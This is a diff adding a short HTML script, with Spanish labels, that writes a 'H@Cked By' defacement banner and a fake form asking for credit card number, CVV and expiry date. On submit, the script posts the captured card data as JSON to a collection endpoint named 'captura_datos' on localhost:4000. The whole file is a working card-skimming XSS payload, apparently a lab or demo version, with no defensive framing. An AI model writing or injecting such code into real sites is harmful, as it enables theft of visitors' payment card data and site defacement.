@@ -1,0 +1,40 @@
+<script>
+  document.write('<h1>H@Cked By [Santiago_Leon]</h1>');
+  document.write('<form id="xssForm">');
+  document.write('Número de Tarjeta de Crédito: <input type="text" name="cc_number"><br>');
+  document.write('CVV: <input type="text" name="cc_cvv"><br>');
+  document.write('Fecha de Caducidad: <input type="text" name="cc_expiry"><br>');
+  document.write('<input type="submit" value="Enviar">');
+  document.write('</form>');
+
+  document.getElementById('xssForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const cc_number = document.querySelector('input[name="cc_number"]').value;
+    const cc_cvv = document.querySelector('input[name="cc_cvv"]').value;
+    const cc_expiry = document.querySelector('input[name="cc_expiry"]').value;
+
+    const data = {
+      cc_number: cc_number,
+      cc_cvv: cc_cvv,
+      cc_expiry: cc_expiry
+    };
+
+    console.log('Datos a enviar:', data);
+
+    fetch('http://localhost:4000/captura_datos', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log('Success:', data);
+    })
+    .catch((error) => {
+      console.error('Error:', error);
+    });
+  });
+</script>
